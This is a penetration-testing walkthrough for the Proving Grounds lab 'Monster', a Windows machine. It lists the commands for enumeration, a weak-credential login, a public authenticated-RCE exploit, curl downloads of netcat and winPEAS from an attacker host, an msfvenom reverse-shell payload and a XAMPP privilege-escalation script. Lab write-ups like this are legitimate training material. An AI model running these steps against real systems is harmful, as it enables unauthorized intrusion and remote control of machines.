---
title: Monster
date: 2026-01-27T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - searchsploit
  - winpeas
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Monster"
---

sudo nmap $4  -p- --open --max-rate 5000

![](Screenshot%202026-01-08%20at%2013.15.10.png)

smbmap -H 192.168.197.180   

![](Screenshot%202026-01-08%20at%2013.46.56.png)

Nothing
------ 
HTTP

![](Screenshot%202026-01-08%20at%2013.47.52.png)

![](Screenshot%202026-01-08%20at%2013.50.24.png)

![](Screenshot%202026-01-08%20at%2013.51.35.png)

Got some good looking Authenticated RCE's
Maybe we can shake out some creds!!

Weak credentials allowed us to login via http://192.168.226.180/blog/users/login
	There was a minor issue, the site redirected us to http://monsta.pg/blog/users

If this happens just replace montser.org with the correct IP address.

`http://192.168.226.180/blog/users/1`

![](Screenshot%202026-01-09%20at%2009.34.18.png)



![](Screenshot%202026-01-09%20at%2009.39.16.png)

When I ran this I got an error. 
	it wants: 

`python3 52038.py http://192.168.226.180 admin wazowski`
![](Screenshot%202026-01-09%20at%2009.41.06.png)

There is a lot of syntax errors in this scrip. 
	Fix the indentation issies.. 
	And the line wrap issues. The errors will help. 

Also, you need to change the /etc/hosts file and and add: `[your IP] monster.pg`

![](Screenshot%202026-01-09%20at%2017.06.46.png)

`python 52038.py http://monster.pg/blog admin wazowski

![](Screenshot%202026-01-09%20at%2017.04.53.png)

Enter the url into your browser and start enumeration.
	dir
	whoami /a
	systeminfo

![](Screenshot%202026-01-10%20at%2008.08.53.png)



Move over a copy of netcat64 using curl:

`python -m http.server 81`

`curl  http://192.168.45.188:81/nc64.exe -o  nc.exe.php`

![](Screenshot%202026-01-10%20at%2008.11.44.png)

Start your listener:

`sudo rlwrap nc -lvnp 80`

![](Screenshot%202026-01-09%20at%2018.19.05.png)

![](Screenshot%202026-01-09%20at%2018.18.36.png)

Move winPEAS onto the victim machine:

Kali:
`winpeas`
		
`python http.server 81`

Victim:

`curl 192.168.45.188:81/winPEASany.exe -o wimp.exe`

![](Screenshot%202026-01-10%20at%2008.20.44.png)

![](Screenshot%202026-01-10%20at%2008.43.06.png)

![](Screenshot%202026-01-10%20at%2008.46.55.png)

There seems to be an privilege escalation exploit for xampp.

![](Screenshot%202026-01-10%20at%2016.23.02.png)

`msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.188 LPORT=1234 -f exe -o msf.exe`


![](Screenshot%202026-01-10%20at%2016.15.21.png)

Move the executable to the victim machine. 

`cd /Users/Mike/Desktop/`

`curl http://192.168.45.188:81/msf.exe -o msf.exe`

Change the 50337.ps1 script to the correct file path.

![](Screenshot%202026-01-10%20at%2016.29.41.png)

Start a listener on the correct port.

![](Screenshot%202026-01-10%20at%2016.02.28.png)